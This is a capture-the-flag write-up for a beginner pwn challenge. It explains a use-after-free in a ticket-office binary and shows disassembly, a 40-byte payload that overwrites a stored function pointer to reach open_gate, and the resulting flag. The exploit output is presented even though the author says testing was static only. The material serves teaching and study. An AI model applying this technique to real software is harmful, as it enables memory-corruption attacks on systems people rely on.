# Dockside Ticket Office - Pwn (Beginner)

**Flag:** `CSSCTF{us3_4ft3r_fr33_d0cks1d3}`
**Attached file:** `dockside_ticket` (Size: 16,664 B, SHA256: `b275a7c2...49dd`)

## Challenge

The challenge is a software device system assisting in port ticket sales, designed with feature groups: initialize, cancel, edit, and use tickets. Operationally, once a ticket has been canceled, that ticket is invalidated and cannot be used. However, the device source code harbors unsafe memory management vulnerabilities. The challenge objective: Exploit that vulnerability to manipulate a canceled ticket, transforming it into a tool to open an emergency access route.

## Analysis

Evaluating the binary: 64-bit ELF format, the system does not apply the Position Independent Executable (PIE) mechanism, supports partial RELRO, has No-eXecute (NX) activated, and symbol tables are not stripped. The program structure focuses on six core functions with clear identifiers: `create_ticket`, `cancel_ticket`, `edit_ticket`, `use_ticket`, and two destination functions being `open_gate` and `deny_access`.

In the `create_ticket` function, the allocation process creates a memory chunk with a capacity of 0x28 bytes. Here, the system writes the format string `"GUEST"` to the beginning of the memory region. The relevant detail is: **the system embeds a function pointer at offset position 0x20**, and this pointer is initialized by default pointing to the `deny_access` function:

```assembly
40137c:  mov    edi,0x28
401381:  call   malloc@plt
401386:  mov    QWORD PTR [rip+0x2cdb],rax      # active_ticket = newly created memory chunk
401394:  mov    DWORD PTR [rax],0x53455547       # Insert string "GUEST"
4013a7:  lea    rdx,[rip-0x178]                  # Get address of deny_access function
4013ae:  mov    QWORD PTR [rax+0x20],rdx         # Insert function pointer at offset 0x20
```

## Solution

**Step 1 - Analyze the memory pointer management state.**
Check the `cancel_ticket` function structure; this function solely executes a `free` function call and prints a message:

```assembly
4013e8:  mov    rax,[rip+0x2c79]        # Load active_ticket pointer
4013f2:  call   free@plt                # Free memory region
401401:  call   puts@plt                # Print message "Ticket cancelled."
```

An overall survey of the binary reveals that the global variable `active_ticket` is only assigned data by the system **exactly once** (at address `create_ticket+0x2f`). The consequence of this architecture is that after performing the ticket cancellation operation (calling the `free` function), the global variable `active_ticket` is not reset to null; instead, it continues to maintain its state pointing to the freed memory region. This is the classic Use-After-Free (UAF) vulnerability.

**Step 2 - Manipulate the freed memory region.**
The `edit_ticket` function deploys an incomplete check mechanism: It only checks the condition that the pointer variable is non-zero, and then calls the `read(0, active_ticket, 0x28)` command. When sending a payload with a size of 40 bytes, this data amount completely fits within the chunk's capacity. Consequently, the data range from byte 32 to 39 (corresponding to the offset position 0x20 containing the function pointer) will be subject to complete control manipulation by the user:

```python
payload = b"A" * 32 + struct.pack("<Q", 0x40125F)   # Exact size 40 bytes, matching read(0x28) limits
```

**Step 3 - Deploy the activation procedure.**
The `use_ticket` function processes executing the established function pointer directly, without deploying an independent validity verification (vetting) procedure:

```assembly
401492:  mov    rdx,QWORD PTR [rax+0x20]
40149b:  call   rdx
```

Because the PIE memory randomization mechanism has been disabled, the execution address of the `open_gate` function is a fixed constant, the exploiter does not need to use memory leak techniques.

**Step 4 - Validate the integrity of the destination address.**
The `open_gate` function is designed to output three character strings to the screen. The third string is loaded from the static memory region `.rodata` at address `0x402088` (corresponding to virtual memory address vaddr 0x402000, referring to file offset 0x2000). Inspecting this data block outputs exactly the required flag string:

```text
0x402008 -> 'Ticket scanned.'
0x402060 -> 'Emergency harbour access granted.'
0x402088 -> 'CSSCTF{us3_4ft3r_fr33_d0cks1d3}'
```

This string data exists verbatim in the static file structure.

**Combat Environment Note:** Practical testing and analysis were conducted on a Windows environment (under conditions lacking a WSL distribution system or emulator). The exploitation process is proven in the form of static computational analysis. The `exploit.py` script code ensures compatible operation for both a local Linux-based system and over a network connection:

```bash
python exploit.py --run ./dockside_ticket
python exploit.py --host <challenge_host> --port <port>
```

## Result

The trial run process generating the byte payload string:

```bash
$ python exploit.py --payload
```

Output:
```text
script menu: 310a320a330a41414141414141414141414141414141414141414141414141414141414141415f124000000000000a340a350a
payload edit: 41414141414141414141414141414141414141414141414141414141414141415f12400000000000

CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```

The forty bytes of the `payload edit` string consist of 32 padding bytes combined with the byte string `5f12400000000000`. This structure corresponds to the address `0x40125f` (the address of the `open_gate` function) represented in Little-Endian format.

Result:
```text
CSSCTF{us3_4ft3r_fr33_d0cks1d3}
```
